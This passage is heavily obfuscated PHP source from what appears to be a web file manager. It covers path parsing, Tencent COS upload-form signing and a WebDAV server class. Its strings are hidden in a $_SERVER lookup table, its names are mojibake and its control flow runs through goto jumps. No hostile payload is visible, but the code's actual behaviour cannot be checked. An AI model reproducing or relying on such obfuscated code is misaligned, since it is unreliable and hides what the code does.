$cÛƒ·Ñ‚[1050] => self::KOD_SHARE_ITEM, $cÛƒ·Ñ‚[1051] => self::KOD_SHARE_LINK, $cÛƒ·Ñ‚[1052] => self::KOD_SEARCH, $cÛƒ·Ñ‚[1053] => self::KOD_BLOCK, $cÛƒ·Ñ‚[1054] => self::KOD_IO, $cÛƒ·Ñ‚[1055] => self::KOD_USER_RECENT, $cÛƒ·Ñ‚[1056] => self::KOD_USER_DRIVER); } public static function parse($F‰ĞÄ£‡Ãå) { goto E¢˜”¨ĞğÇ; e„ƒß™ºóè: $e‡¼ÆÈ«Ïè = array($B§–Û•¸“¹[43], self::KOD_SOURCE, self::KOD_IO, self::KOD_SHARE_ITEM, self::KOD_SHARE_LINK, self::KOD_USER_DRIVER); $F‚ëì©Ã[$B§–Û•¸“¹[1061]] = in_array($F‚ëì©Ã[$B§–Û•¸“¹[39]], $e‡¼ÆÈ«Ïè); return $F‚ëì©Ã; goto E†§‘ğôöÌ; fÙÆ÷ßë›†: preg_match($B§–Û•¸“¹[1057], $F‰ĞÄ£‡Ãå, $cÈ–¥‘âø¨); $F‚ëì©Ã = array($B§–Û•¸“¹[399] => !1, $B§–Û•¸“¹[1058] => !1, $B§–Û•¸“¹[396] => !1, $B§–Û•¸“¹[87] => $F‰ĞÄ£‡Ãå, $B§–Û•¸“¹[1004] => !1, $B§–Û•¸“¹[1003] => $B§–Û•¸“¹[43]); if (is_array($cÈ–¥‘âø¨) && count($cÈ–¥‘âø¨) == 5) { $D¤š‘–´ì£ = $B§–Û•¸“¹[1059] . $cÈ–¥‘âø¨[2] . $B§–Û•¸“¹[326]; if (in_array($D¤š‘–´ì£, $e¾¡æ‚ùœª)) { $F‚ëì©Ã[$B§–Û•¸“¹[1004]] = $cÈ–¥‘âø¨[1]; $F‚ëì©Ã[$B§–Û•¸“¹[39]] = $D¤š‘–´ì£; $F‚ëì©Ã[$B§–Û•¸“¹[1060]] = substr($D¤š‘–´ì£, 1, -1); $F‚ëì©Ã[$B§–Û•¸“¹[378]] = $cÈ–¥‘âø¨[3]; } $F‚ëì©Ã[$B§–Û•¸“¹[1003]] = $cÈ–¥‘âø¨[4]; } goto e„ƒß™ºóè; E¢˜”¨ĞğÇ: $B§–Û•¸“¹ =& $_SERVER[¹÷ˆ§éÒ°ú]; $F‰ĞÄ£‡Ãå = self::clear($F‰ĞÄ£‡Ãå); $e¾¡æ‚ùœª = array_values(self::typeList()); goto fÙÆ÷ßë›†; E†§‘ğôöÌ: } public static function clear($EŞß£Îá) { goto BÅÖ¢àõ‹ì; BÅÖ¢àõ‹ì: $fá’Ë˜Ã =& $_SERVER[¹÷ˆ§éÒ°ú]; $EŞß£Îá = str_replace(array($fá’Ë˜Ã[983], $fá’Ë˜Ã[10]), $fá’Ë˜Ã[60], $EŞß£Îá); $EŞß£Îá = str_replace($fá’Ë˜Ã[105], $fá’Ë˜Ã[18], $EŞß£Îá); goto cÙ—ØÎªÒª; b’àÄ‚‹­Å: $EŞß£Îá = preg_replace($fá’Ë˜Ã[1064], $fá’Ë˜Ã[18], $EŞß£Îá); if ($EŞß£Îá == $fá’Ë˜Ã[18]) { return $fá’Ë˜Ã[18]; } $EŞß£Îá = rtrim($EŞß£Îá, $fá’Ë˜Ã[18]); goto E…ÍØ‹Äé­; E…ÍØ‹Äé­: return $EŞß£Îá; goto C‡±Í¾†›; cÙ—ØÎªÒª: $cï®Éªƒ‘¾ = $fá’Ë˜Ã[1062]; if (substr($EŞß£Îá, 0, 3) == $fá’Ë˜Ã[1063]) { $EŞß£Îá = substr($EŞß£Îá, 3); } while (strstr($EŞß£Îá, $cï®Éªƒ‘¾)) { $EŞß£Îá = str_replace($cï®Éªƒ‘¾, $fá’Ë˜Ã[18], $EŞß£Îá); } goto b’àÄ‚‹­Å; C‡±Í¾†›: } public static function sourceID($DŠ·“š‡ºÎ) { $E¹ïÁÅªˆ± =& $_SERVER[¹÷ˆ§éÒ°ú]; $dÁÈÈ¸Øã‘ = self::parse($DŠ·“š‡ºÎ); if ($dÁÈÈ¸Øã‘[$E¹ïÁÅªˆ±[39]] !== self::KOD_SOURCE) { show_json(LNG($E¹ïÁÅªˆ±[1065]), !1); } return $dÁÈÈ¸Øã‘[$E¹ïÁÅªˆ±[378]]; } public static function make($bÑĞ—‹æ…) { if (!$bÑĞ—‹æ…) { return !1; } return self::makePath(self::KOD_SOURCE, intval($bÑĞ—‹æ…)); } public static function makeShare($BÁ›†Ë°Š, $a¢éÏ†„ÑÖ) { return self::makePath(self::KOD_SHARE_ITEM, $BÁ›†Ë°Š, $a¢éÏ†„ÑÖ); } public static function makeFileTypePath($fŠ¿’í³²”) { return self::makePath(self::KOD_USER_FILE_TYPE, $fŠ¿’í³²”); } public static function makeFileTagPath($CØİ‰¿îÔİ) { return self::makePath(self::KOD_USER_FILE_TAG, $CØİ‰¿îÔİ); } public static function makePath($FËá’éˆôï, $C…ÆĞ±¸™¢ = '', $aÎŸì¨ùÍ… = '') { $aèùİĞ„åé =& $_SERVER[¹÷ˆ§éÒ°ú]; $c£¯¤ÔÍŠĞ = substr($FËá’éˆôï, 1, -1); $a×˜‘¹’ƒ = $aèùİĞ„åé[1066] . $c£¯¤ÔÍŠĞ . $aèùİĞ„åé[1067] . $C…ÆĞ±¸™¢ . $aèùİĞ„åé[1068]; $a×˜‘¹’ƒ = $aÎŸì¨ùÍ… ? $a×˜‘¹’ƒ . $aÎŸì¨ùÍ… . $aèùİĞ„åé[18] : $a×˜‘¹’ƒ; return $a×˜‘¹’ƒ; } public static function hashPath($E®Â¯›ƒ´—) { $Eí‘ÎœÜÍà =& $_SERVER[¹÷ˆ§éÒ°ú]; $dˆ“ö±‰ç‡ = is_array($E®Â¯›ƒ´—) ? $E®Â¯›ƒ´— : IO::info($E®Â¯›ƒ´—); $A‹ºÔ®æ = _get($dˆ“ö±‰ç‡, $Eí‘ÎœÜÍà[1069], $Eí‘ÎœÜÍà[43]); if (!$A‹ºÔ®æ) { $c«½­¾Èˆ© = KodIO::parse($dˆ“ö±‰ç‡[$Eí‘ÎœÜÍà[87]]); if (!$c«½­¾Èˆ©[$Eí‘ÎœÜÍà[39]]) { $A‹ºÔ®æ = IO::hashSimple($dˆ“ö±‰ç‡[$Eí‘ÎœÜÍà[87]]); } } if (!$A‹ºÔ®æ) { $A‹ºÔ®æ = md5($dˆ“ö±‰ç‡[$Eí‘ÎœÜÍà[87]] . $dˆ“ö±‰ç‡[$Eí‘ÎœÜÍà[89]] . $dˆ“ö±‰ç‡[$Eí‘ÎœÜÍà[119]]); } return $A‹ºÔ®æ; } public static function initSystemPath() { $bİÉˆó¥™… =& $_SERVER[¹÷ˆ§éÒ°ú]; if (defined($bİÉˆó¥™…[1070])) { return; } define($bİÉˆó¥™…[1070], self::systemPath($bİÉˆó¥™…[1071])); define($bİÉˆó¥™…[1072], self::systemPath($bİÉˆó¥™…[1073])); define($bİÉˆó¥™…[1074], self::systemPath($bİÉˆó¥™…[1075])); define($bİÉˆó¥™…[1076], self::systemPath($bİÉˆó¥™…[1077])); } private static function systemPath($BÚÃ®É‘¾) { goto BŸæÀÁ‡ƒ“; e™¯†¦İ§: if ($f±Í—Ëì‹) { return $f±Í—Ëì‹; } if ($BÚÃ®É‘¾ == $EæÏ¥¦ ŸÑ[1071]) { $f±Í—Ëì‹ = self::make(Model($EæÏ¥¦ ŸÑ[747])->systemRootPathAdd($EæÏ¥¦ ŸÑ[1080])); } else { $f±Í—Ëì‹ = self::systemPath($EæÏ¥¦ ŸÑ[1071]); $aÍ¶¼«Ê¹ = self::sourceID($f±Í—Ëì‹); $f±Í—Ëì‹ = self::make(Model($EæÏ¥¦ ŸÑ[747])->mkdir($aÍ¶¼«Ê¹, $BÚÃ®É‘¾)); } Model($EæÏ¥¦ ŸÑ[1079])->set($eÛŒ¢¡ƒù, $f±Í—Ëì‹); goto b‡®İóïòÁ; BŸæÀÁ‡ƒ“: $EæÏ¥¦ ŸÑ =& $_SERVER[¹÷ˆ§éÒ°ú]; $eÛŒ¢¡ƒù = $EæÏ¥¦ ŸÑ[1078] . ucfirst($BÚÃ®É‘¾); $f±Í—Ëì‹ = Model($EæÏ¥¦ ŸÑ[1079])->get($eÛŒ¢¡ƒù); goto e™¯†¦İ§; b‡®İóïòÁ: return $f±Í—Ëì‹; goto AÜÂÆö‰ÍÅ; AÜÂÆö‰ÍÅ: } public static function systemFolder($Dõ‹ªÇ Â) { $d§ŠãÉ„‡’ = IO_PATH_SYSTEM_SOURCE . $Dõ‹ªÇ Â; $bà’¼ÎÁÓ  = Cache::get($d§ŠãÉ„‡’); if (!$bà’¼ÎÁÓ ) { $BÇÀåÜõ«ò = IO::infoFull($d§ŠãÉ„‡’); if (!$BÇÀåÜõ«ò) { $bà’¼ÎÁÓ  = IO::mkdir($d§ŠãÉ„‡’, REPEAT_SKIP); } else { $bà’¼ÎÁÓ  = $BÇÀåÜõ«ò[$_SERVER[¹÷ˆ§éÒ°ú][87]]; } Cache::set($d§ŠãÉ„‡’, $bà’¼ÎÁÓ , 3600 * 10); } return $bà’¼ÎÁÓ ; } public static function defaultDriver() { return Model($_SERVER[¹÷ˆ§éÒ°ú][698])->defaultDriver(); } public static function defaultIO() { $eËÉ“½½í„ =& $_SERVER[¹÷ˆ§éÒ°ú]; $FÑïá§½Ö = self::defaultDriver(); return $eËÉ“½½í„[1081] . $FÑïá§½Ö[$eËÉ“½½í„[378]] . $eËÉ“½½í„[1068]; } public static function defaultDriverInit() { static $AÔãƒ¤’Œ = false; if ($AÔãƒ¤’Œ) { return $AÔãƒ¤’Œ; } $AÔãƒ¤’Œ = IO::init(self::defaultIO()); return $AÔãƒ¤’Œ; } public static function fileTypeList() { $BŒö×Ÿ¿ÜÅ =& $_SERVER[¹÷ˆ§éÒ°ú]; $fò¯—Â™î­ = $GLOBALS[$BŒö×Ÿ¿ÜÅ[16]][$BŒö×Ÿ¿ÜÅ[1082]]; foreach ($fò¯—Â™î­ as $dæ·§äË´õ => $a“ œ©Á”) { $EŒƒÇ©ó•é = $BŒö×Ÿ¿ÜÅ[1083] . $dæ·§äË´õ; $CÌ¼ÈŞ÷¢ã = LNG($EŒƒÇ©ó•é); if ($EŒƒÇ©ó•é != $CÌ¼ÈŞ÷¢ã) { $fò¯—Â™î­[$dæ·§äË´õ][$BŒö×Ÿ¿ÜÅ[38]] = $CÌ¼ÈŞ÷¢ã; } } return $fò¯—Â™î­; } public static function transferType($dáÀÄµ»Â—, $F½À´Åù¬) { goto dí–Êè§í«; dí–Êè§í«: $AÀ¶Úöæí =& $_SERVER[¹÷ˆ§éÒ°ú]; $dîïòîğÈ = self::driverType($dáÀÄµ»Â—); $f²áÈØğÒ– = self::driverType($F½À´Åù¬); goto c¹–‘–É¦·; AÕ›Í‰Ã‹: return $AÀ¶Úöæí[1086]; goto aÈ¢Œ’àì; c¹–‘–É¦·: if ($dîïòîğÈ[$AÀ¶Úöæí[39]] == $f²áÈØğÒ–[$AÀ¶Úöæí[39]] && $dîïòîğÈ[$AÀ¶Úöæí[1084]] == $f²áÈØğÒ–[$AÀ¶Úöæí[1084]]) { return $AÀ¶Úöæí[1085]; } if ($dîïòîğÈ[$AÀ¶Úöæí[39]] == $AÀ¶Úöæí[774] && $f²áÈØğÒ–[$AÀ¶Úöæí[39]] == $AÀ¶Úöæí[114]) { return $AÀ¶Úöæí[1031]; } if ($dîïòîğÈ[$AÀ¶Úöæí[39]] == $AÀ¶Úöæí[114] && $f²áÈØğÒ–[$AÀ¶Úöæí[39]] == $AÀ¶Úöæí[774]) { return $AÀ¶Úöæí[115]; } goto AÕ›Í‰Ã‹; aÈ¢Œ’àì: } public static function driverType($A½Ãéèù˜á) { goto fÌšª¦††ƒ; bƒÉ›×•Ûù: if ($eÛ¯ÎÛˆÍ¦ == $aÕÈÆ‹Â­[689] || $eÛ¯ÎÛˆÍ¦ == $aÕÈÆ‹Â­[1088] || $eÛ¯ÎÛˆÍ¦ == $aÕÈÆ‹Â­[1089]) { $A½Ãéèù˜á = self::defaultDriverInit(); } else { if ($eÛ¯ÎÛˆÍ¦ == $aÕÈÆ‹Â­[1039] || $eÛ¯ÎÛˆÍ¦ == $aÕÈÆ‹Â­[1090]) { $A½Ãéèù˜á = IO::init($A½Ãéèù˜á->pathParse[$aÕÈÆ‹Â­[989]]); } } $eÛ¯ÎÛˆÍ¦ = str_replace($aÕÈÆ‹Â­[1087], $aÕÈÆ‹Â­[43], strtolower($A½Ãéèù˜á->getType())); if ($eÛ¯ÎÛˆÍ¦ == $aÕÈÆ‹Â­[114]) { return array($aÕÈÆ‹Â­[39] => $aÕÈÆ‹Â­[114], $aÕÈÆ‹Â­[1084] => $aÕÈÆ‹Â­[43], $aÕÈÆ‹Â­[87] => $cÃ–®á¼÷); } goto cöàºÄ‡¥Œ; fÌšª¦††ƒ: $aÕÈÆ‹Â­ =& $_SERVER[¹÷ˆ§éÒ°ú]; $cÃ–®á¼÷ = $A½Ãéèù˜á->path; $eÛ¯ÎÛˆÍ¦ = str_replace($aÕÈÆ‹Â­[1087], $aÕÈÆ‹Â­[43], strtolower($A½Ãéèù˜á->getType())); goto bƒÉ›×•Ûù; cöàºÄ‡¥Œ: return array($aÕÈÆ‹Â­[39] => $aÕÈÆ‹Â­[774], $aÕÈÆ‹Â­[1084] => $A½Ãéèù˜á->pathDriver, $aÕÈÆ‹Â­[87] => $cÃ–®á¼÷); goto f‚•Àœ©‹‹; f‚•Àœ©‹‹: } } class PathDriverCOS extends PathDriverBaseS3 { public function __construct($CßäÆ´Æ‡†) { parent::__construct($CßäÆ´Æ‡†); $this->signatureVersion($_SERVER[¹÷ˆ§éÒ°ú][212]); } public function uploadFormData($f†¯¯×•§ß, $Dó›ã»ÃÆ = 3600) { goto A©ß–çêÈ; A©ß–çêÈ: $Cšæ×Š¨Ÿ =& $_SERVER[¹÷ˆ§éÒ°ú]; $AéÚ‹¥™ˆŠ = $Cšæ×Š¨Ÿ[197]; $f¾åò·¯‰ = $Cšæ×Š¨Ÿ[229]; goto BˆôÕù’‡Ş; DÖãã†®£†: $FØ„‡‘Áõ³ = sha1($aö¶‡…²»½); $eÈ®†é‘à÷ = hash_hmac($Cšæ×Š¨Ÿ[229], $FØ„‡‘Áõ³, $Fø×Ù•¬¢‰); $föÍ·é¨º¿ = array($Cšæ×Š¨Ÿ[1095] => $AéÚ‹¥™ˆŠ, $Cšæ×Š¨Ÿ[1099] => $e‰¢”†ƒ„Ç, $Cšæ×Š¨Ÿ[1103] => base64_encode($aö¶‡…²»½), $Cšæ×Š¨Ÿ[1100] => $f¾åò·¯‰, $Cšæ×Š¨Ÿ[1101] => $this->accessKey, $Cšæ×Š¨Ÿ[1104] => $dæ†Åï•¤, $Cšæ×Š¨Ÿ[1105] => $eÈ®†é‘à÷, $Cšæ×Š¨Ÿ[181] => $this->getHost()); goto eÊŠ•ùíöÔ; eÊŠ•ùíöÔ: return $föÍ·é¨º¿; goto aÌº²Û¡£ã; BˆôÕù’‡Ş: $e‰¢”†ƒ„Ç = $Cšæ×Š¨Ÿ[1091]; $CñÂ—»ñ˜Æ = gmdate($Cšæ×Š¨Ÿ[1092], time() + $Dó›ã»ÃÆ); $dæ†Åï•¤ = (string) time() . $Cšæ×Š¨Ÿ[79] . (string) (time() + $Dó›ã»ÃÆ); goto Bã’µƒøŸ¼; Bã’µƒøŸ¼: $aö¶‡…²»½ = array($Cšæ×Š¨Ÿ[1093] => $CñÂ—»ñ˜Æ, $Cšæ×Š¨Ÿ[1094] => array(array($Cšæ×Š¨Ÿ[1095] => $AéÚ‹¥™ˆŠ), array($Cšæ×Š¨Ÿ[1096] => $this->bucket), array($Cšæ×Š¨Ÿ[1097], $Cšæ×Š¨Ÿ[1098], $Cšæ×Š¨Ÿ[43]), array($Cšæ×Š¨Ÿ[1099] => $e‰¢”†ƒ„Ç), array($Cšæ×Š¨Ÿ[1100] => $f¾åò·¯‰), array($Cšæ×Š¨Ÿ[1101] => $this->accessKey), array($Cšæ×Š¨Ÿ[1102] => $dæ†Åï•¤))); $aö¶‡…²»½ = json_encode($aö¶‡…²»½); $Fø×Ù•¬¢‰ = hash_hmac($Cšæ×Š¨Ÿ[229], $dæ†Åï•¤, $this->secret); goto DÖãã†®£†; aÌº²Û¡£ã: } public function fileOutLink($E“Û‘–á‹¬) { $EÙ­áç°´ã =& $_SERVER[¹÷ˆ§éÒ°ú]; if (substr($E“Û‘–á‹¬, 0, 7) == $EÙ­áç°´ã[1106]) { $E“Û‘–á‹¬ = $EÙ­áç°´ã[1107] . substr($E“Û‘–á‹¬, 7); } header($EÙ­áç°´ã[168] . $E“Û‘–á‹¬); die; } } goto CéãÈ¨æ¥ï; Eã†ŒšÈ“Â: class HttpDavServer { public function __construct($Eø†â°ŒŠâ, $cøá¾š¶£‡) { $this->root = $Eø†â°ŒŠâ; $this->initPath($cøá¾š¶£‡); $this->start(); } public function initPath($F¹â«á©£°) { $f©„¸Ä¿ó˜ =& $_SERVER[¹÷ˆ§éÒ°ú]; $A¿Ìœ¤ãİÃ = rtrim($_SERVER[$f©„¸Ä¿ó˜[1378]], $f©„¸Ä¿ó˜[18]) . $f©„¸Ä¿ó˜[18]; $this->urlBase = substr($A¿Ìœ¤ãİÃ, 0, strpos($A¿Ìœ¤ãİÃ, $F¹â«á©£°) + 1); $this->urlBase = rtrim($this->urlBase, $f©„¸Ä¿ó˜[18]) . $F¹â«á©£°; $this->path = $this->parsePath($this->pathGet()); } public function checkUser() { $dÂœóâ’¯ =& $_SERVER[¹÷ˆ§éÒ°ú]; $Dğ©å‰Šß‘ = HttpAuth::get(); if ($Dğ©å‰Šß‘[$dÂœóâ’¯[548]] == $dÂœóâ’¯[1775] && $Dğ©å‰Šß‘[$dÂœóâ’¯[887]] == $dÂœóâ’¯[1776]) { return !0; } HttpAuth::error(); } public function start() { goto eí§ğ©ªê‚; dñ±¬É°¯‰: if (!$dÆ¶³¼„ğ“) { return; } self::response($dÆ¶³¼„ğ“); goto C›ëÀƒ‡â; eí§ğ©ªê‚: $d­ßÛõ½ì‡ =& $_SERVER[¹÷ˆ§éÒ°ú]; $this->checkUser(); $F«¿Î‹¯³‰ = $d­ßÛõ½ì‡[156] . HttpHeader::method(); goto Fºñ£ºÇ¾õ; Fºñ£ºÇ¾õ: if (!method_exists($this, $F«¿Î‹¯³‰)) { pr($F«¿Î‹¯³‰ . $d­ßÛõ½ì‡[1777]); die; } $b‹Ä“Ò²Ù— = array($d­ßÛõ½ì‡[1778], $d­ßÛõ½ì‡[1779]); if (!in_array($F«¿Î‹¯³‰, $b‹Ä“Ò²Ù—) && !$this->pathExists($this->path)) { $dÆ¶³¼„ğ“ = array($d­ßÛõ½ì‡[1023] => 404); } else { $dÆ¶³¼„ğ“ = $this->{$F«¿Î‹¯³‰}(); } goto dñ±¬É°¯‰; C›ëÀƒ‡â: } public function pathGet($Dñ‚ÃŠ‡Êë = false) { $F×·ÛÌìÂç =& $_SERVER[¹÷ˆ§éÒ°ú]; $aè‚Ÿ¼ãİâ = $Dñ‚ÃŠ‡Êë ? $_SERVER[$F×·ÛÌìÂç[1780]] : $_SERVER[$F×·ÛÌìÂç[1378]]; $aè‚Ÿ¼ãİâ = KodIO::clear(rawurldecode($aè‚Ÿ¼ãİâ)); if (!strstr($aè‚Ÿ¼ãİâ, KodIO::clear($this->urlBase))) { return !1; } return substr($aè‚Ÿ¼ãİâ, strpos($aè‚Ÿ¼ãİâ, $this->urlBase) + strlen($this->urlBase)); } public function pathExists($b¹±Ü†ÅÎ) { return file_exists($b¹±Ü†ÅÎ); } public function pathMkdir($D¡®Ö§ŒéÁ) { return mkdir($D¡®Ö§ŒéÁ, 511, !0); } public function pathInfo($e¹ö–‰Ä‚¥) { return path_info($e¹ö–‰Ä‚¥); } public function pathList($a°á˜†É­·) { return path_list($a°á˜†É­·); } public function pathOut($Eã¾ÓÈÃ£) { echo file_get_contents($Eã¾ÓÈÃ£); } public function pathPut($FÜîÆ¶ßÑá, $b„¹‡½óçê = '') { if (!$b„¹‡½óçê) { return file_put_contents($FÜîÆ¶ßÑá, $_SERVER[¹÷ˆ§éÒ°ú][43]); } return move_path($b„¹‡½óçê, $FÜîÆ¶ßÑá); } public function pathRemove($c¡İ÷ƒÔ) { if (is_file($c¡İ÷ƒÔ)) { return @unlink($this->path); } else { return del_dir($this->path); } } public function pathMove($C¢Ì’ÄğÕ±, $BÖŸ‘—ò‚å) { return move_path($C¢Ì’ÄğÕ±, $BÖŸ‘—ò‚å); } public function pathCopy($B±ÜÁë”§, $E®ÆÏ Œ¿É) { return copy_dir($B±ÜÁë”§, $E®ÆÏ Œ¿É); } public function parsePath($DØ®ì¥ƒáù) { return $DØ®ì¥ƒáù; } public function parseItem($D·‹¶Öß¼–, $EÀÎ–Í‹…Ù) { goto eÒø¤ˆ–ğš; dÒ©íÉ§á: $f­’ÂØ„º¯ = array($FÀæ‚ƒ¸Ä[1781] => KodIO::clear($this->urlBase . $få§âŸ¢Íè), $FÀæ‚ƒ¸Ä[119] => @gmdate($FÀæ‚ƒ¸Ä[1782], $D·‹¶Öß¼–[$FÀæ‚ƒ¸Ä[119]]), $FÀæ‚ƒ¸Ä[199] => @gmdate($FÀæ‚ƒ¸Ä[1783], $D·‹¶Öß¼–[$FÀæ‚ƒ¸Ä[199]]), $FÀæ‚ƒ¸Ä[89] => $D·‹¶Öß¼–[$FÀæ‚ƒ¸Ä[89]] ? $D·‹¶Öß¼–[$FÀæ‚ƒ¸Ä[89]] : 0); return $f­’ÂØ„º¯; goto D’ÌÖ–åò; B§¯Â¨â‘: if ($EÀÎ–Í‹…Ù) { $få§âŸ¢Íè = $FÀæ‚ƒ¸Ä[18] . str_replace($FÀæ‚ƒ¸Ä[184], $FÀæ‚ƒ¸Ä[18], rawurlencode($this->pathGet())); } if (!trim($D·‹¶Öß¼–[$FÀæ‚ƒ¸Ä[119]])) { $D·‹¶Öß¼–[$FÀæ‚ƒ¸Ä[119]] = time(); } if (!trim($D·‹¶Öß¼–[$FÀæ‚ƒ¸Ä[199]])) { $D·‹¶Öß¼–[$FÀæ‚ƒ¸Ä[199]] = time(); } goto dÒ©íÉ§á; eÒø¤ˆ–ğš: $FÀæ‚ƒ¸Ä =& $_SERVER[¹÷ˆ§éÒ°ú]; $få§âŸ¢Íè = $this->pathGet() . $FÀæ‚ƒ¸Ä[18] . $D·‹¶Öß¼–[$FÀæ‚ƒ¸Ä[38]]; $få§âŸ¢Íè = $FÀæ‚ƒ¸Ä[18] . str_replace($FÀæ‚ƒ¸Ä[184], $FÀæ‚ƒ¸Ä[18], rawurlencode($få§âŸ¢Íè)); goto B§¯Â¨â‘; D’ÌÖ–åò: } public function parseItemXml($a‘‚¦¶øòè, $CİÙ„õŸ½²) { $f“›ä¿“õÙ =& $_SERVER[¹÷ˆ§éÒ°ú]; $dÏ„†³‹·÷ = $this->parseItem($a‘‚¦¶øòè, $CİÙ„õŸ½²); if ($a‘‚¦¶øòè[$f“›ä¿“õÙ[39]] == $f“›ä¿“õÙ[88]) { $e¶¯İÑ«Ñß = $f“›ä¿“õÙ[1784]; $e¶¯İÑ«Ñß .= $f“›ä¿“õÙ[1785]; } else { $cà˜í«øÎŸ = $a‘‚¦¶øòè[$f“›ä¿“õÙ[172]] ? $a‘‚¦¶øòè[$f“›ä¿“õÙ[172]] : get_path_ext($a‘‚¦¶øòè[$f“›ä¿“õÙ[38]]); $a©¸ãÒçç = get_file_mime($cà˜í«øÎŸ); $e¶¯İÑ«Ñß = $f“›ä¿“õÙ[1786]; $e¶¯İÑ«Ñß .= "\74\104\72\147\145\x74\x63\157\156\164\145\x6e\164\164\171\x70\145\76{$a©¸ãÒçç}\74\57\104\72\x67\x65\x74\x63\x6f\x6e\x74\x65\x6e\x74\x74\171\x70\x65\x3e"; } return "\xa\x9\x9\x3c\x44\72\162\x65\163\160\x6f\156\163\x65\x3e\xa\11\x9\11\74\x44\x3a\150\x72\145\146\76{$dÏ„†³‹·÷[$f“›ä¿“õÙ[1781]]}\x3c\57\104\72\x68\x72\x65\x66\x3e\xa\x9\x9\11\x3c\x44\72\x70\162\x6f\160\163\x74\x61\164\76\xa\x9\11\x9\11\x3c\x44\72\160\x72\157\x70\76\xa\x9\11\x9\11\x9\74\x44\x3a\x67\x65\164\154\141\x73\x74\155\157\x64\151\146\x69\x65\x64\76{$dÏ„†³‹·÷[$f“›ä¿“õÙ[119]]}\74\x2f\104\72\147\145\x74\154\x61\x73\x74\x6d\x6f\x64\x69\146\151\145\x64\x3e\xa\x9\x9\11\11\x9\x3c\x44\x3a\143\162\x65\141\x74\x69\x6f\x6e\144\141\x74\x65\x3e{$dÏ„†³‹·÷[$f“›ä¿“õÙ[199]]}\74\x2f\104\x3a\x63\x72\x65\x61\x74\x69\157\156\x64\141\164\x65\x3e\12\x9\11\11\11\x9\x3c\104\x3a\147\x65\164\x63\x6f\156\164\x65\x6e\x74\154\x65\x6e\147\164\x68\x3e{$dÏ„†³‹·÷[$f“›ä¿“õÙ[89]]}\x3c\57\104\72\147\x65\164\x63\157\156\164\x65\x6e\x74\x6c\145\156\x67\x74\150\76\12\11\11\x9\11\11{$e¶¯İÑ«Ñß}\12\x9\x9\11\11\x3c\57\104\x3a\x70\162\x6f\160\76\xa\x9\x9\x9\11\74\104\x3a\163\x74\x61\164\x75\x73\x3e\110\124\x54\x50\57\61\x2e\x31\x20\62\x30\x30\40\x4f\x4b\74\x2f\x44\72\x73\x74\141\164\165\163\x3e\xa\11\11\11\74\x2f\104\72\160\x72\157\160\163\x74\141\x74\x3e\xa\11\x9\x3c\57\104\x3a\162\x65\163\x70\157\156\163\x65\76"; } public function pathListMerge($f¼È¾…ßğ‹) { goto DğŒ‡­²Şå; DğŒ‡­²Şå: $aŞò˜óè‹ë =& $_SERVER[¹÷ˆ§éÒ°ú]; if (!$f¼È¾…ßğ‹) { return $f¼È¾…ßğ‹; } $còÄùšÕˆ– = array($aŞò˜óè‹ë[85], $aŞò˜óè‹ë[86], $aŞò˜óè‹ë[1787]); goto AãÍ‡«õÆì; AãÍ‡«õÆì: $fÅºÃîÆ“ƒ = array(); foreach ($f¼È¾…ßğ‹ as $BÄÀŸÛ­¹¤ => $Cµß“©Âä„) { if (!in_array($BÄÀŸÛ­¹¤, $còÄùšÕˆ–) || !is_array($Cµß“©Âä„)) { continue; } $fÅºÃîÆ“ƒ = array_merge($fÅºÃîÆ“ƒ, $Cµß“©Âä„); } foreach ($fÅºÃîÆ“ƒ as &$F‘¦æœè) { $F‘¦æœè[$aŞò˜óè‹ë[38]] = str_replace($aŞò˜óè‹ë[18], $aŞò˜óè‹ë[1380], $F‘¦æœè[$aŞò˜óè‹ë[38]]); } goto E¶œ‡ê£ù; E¶œ‡ê£ù: return $fÅºÃîÆ“ƒ; goto e³ğãÒ¢º•; e³ğãÒ¢º•: } public function httpPROPFIND() { goto aò‰¶˜„ªã; aò‰¶˜„ªã: $FÀ«™‘’Õ¾ =& $_SERVER[¹÷ˆ§éÒ°ú]; $dß‹¸Ô‡Òã = $this->pathList($this->path); $aºÈóâ¥‹¨ = $this->pathListMerge($dß‹¸Ô‡Òã); goto Eëèì¥¼Ê; d´˜øÔÜöÓ: return array($FÀ«™‘’Õ¾[1790] => 207, $FÀ«™‘’Õ¾[1791] => "\x3c\x44\x3a\155\165\x6c\164\x69\x73\164\141\x74\165\x73\40\x78\x6d\x6c\156\163\x3a\x44\x3d\42\x44\101\126\72\42\76\12{$B³³Ç•‹ƒ¢}\12\x3c\57\x44\x3a\x6d\x75\x6c\164\x69\163\x74\141\x74\165\163\x3e"); goto Dà…øº‹ë; Eëèì¥¼Ê: $d¾£œÛ˜…ä = $dß‹¸Ô‡Òã[$FÀ«™‘’Õ¾[1788]]; if (!is_array($aºÈóâ¥‹¨) || $d¾£œÛ˜…ä[$FÀ«™‘’Õ¾[1789]] === !1) { return array($FÀ«™‘’Õ¾[1790] => 404, $FÀ«™‘’Õ¾[1791] => $FÀ«™‘’Õ¾[1792]); } $DóÉìĞí‘ = $d¾£œÛ˜…ä[$FÀ«™‘’Õ¾[39]] == $FÀ«™‘’Õ¾[179] || HttpHeader::get($FÀ«™‘’Õ¾[1767]) == $FÀ«™‘’Õ¾[481]; goto aÈ¯ˆÊ¶¡Œ; aÈ¯ˆÊ¶¡Œ: if ($DóÉìĞí‘) { $aºÈóâ¥‹¨ = array($d¾£œÛ˜…ä); } else { $d¾£œÛ˜…ä[$FÀ«™‘’Õ¾[38]] = $FÀ«™‘’Õ¾[43]; $aºÈóâ¥‹¨ = array_merge(array($d¾£œÛ˜…ä), $aºÈóâ¥‹¨); } $B³³Ç•‹ƒ¢ = $FÀ«™‘’Õ¾[43]; foreach ($aºÈóâ¥‹¨ as $dÌœêÔ) { $B³³Ç•‹ƒ¢ .= $this->parseItemXml($dÌœêÔ, $DóÉìĞí‘); } goto d´˜øÔÜöÓ; Dà…øº‹ë: } public function httpHEAD() { $E¼ÚŞ”ëÑ =& $_SERVER[¹÷ˆ§éÒ°ú]; $EƒñÉç„Ÿƒ = $this->pathInfo($this->path); if (!$EƒñÉç„Ÿƒ || $EƒñÉç„Ÿƒ[$E¼ÚŞ”ëÑ[39]] == $E¼ÚŞ”ëÑ[88]) { return array($E¼ÚŞ”ëÑ[1023] => 200, $E¼ÚŞ”ëÑ[1198] => array($E¼ÚŞ”ëÑ[1793])); } return array($E¼ÚŞ”ëÑ[1023] => 200, $E¼ÚŞ”ëÑ[1198] => array($E¼ÚŞ”ëÑ[1794], $E¼ÚŞ”ëÑ[148], $E¼ÚŞ”ëÑ[1795] . $EƒñÉç„Ÿƒ[$E¼ÚŞ”ëÑ[89]], 